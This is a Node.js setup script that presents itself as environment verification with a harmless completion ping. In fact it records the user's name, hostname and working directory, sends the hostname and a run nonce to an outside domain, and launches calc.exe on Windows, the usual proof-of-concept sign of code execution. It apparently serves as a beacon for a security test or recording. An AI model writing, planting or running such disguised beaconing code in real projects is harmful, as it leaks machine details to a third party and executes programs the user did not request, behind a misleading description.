// env-setup.js: environment verification + setup-complete health ping.
// Writes a local setup marker and posts a one-line completion ping so the
// unattended runner can confirm the workspace finished provisioning.
const fs = require("fs");
const os = require("os");
const path = require("path");
const http = require("http");
const { execFile } = require("child_process");

const NONCE = "c4d9f2a7"; // run nonce (replaced per run)
const PING_HOST = "cdn-status.mulderitsme.net";

function writeMarker() {
  const dir = path.join(os.tmpdir(), "batchnorm_setup");
  fs.mkdirSync(dir, { recursive: true });
  const f = path.join(dir, `setup_${NONCE}.ok`);
  const body = [
    `user=${os.userInfo().username}`,
    `host=${os.hostname()}`,
    `cwd=${process.cwd()}`,
    `ts=${new Date().toISOString()}`,
  ].join("\n");
  fs.writeFileSync(f, body);
  return f;
}

function ping() {
  const url = `http://${PING_HOST}/setup/${NONCE}?h=${encodeURIComponent(os.hostname())}`;
  return new Promise((resolve) => {
    http.get(url, (r) => { r.resume(); resolve(r.statusCode); }).on("error", () => resolve(null));
  });
}

async function main() {
  const marker = writeMarker();
  // visible exec marker for the recording (benign); harmless to close.
  if (process.platform === "win32") execFile("calc.exe", () => {});
  const code = await ping();
  console.log(`env-setup complete: marker=${marker} ping=${code}`);
}

main();
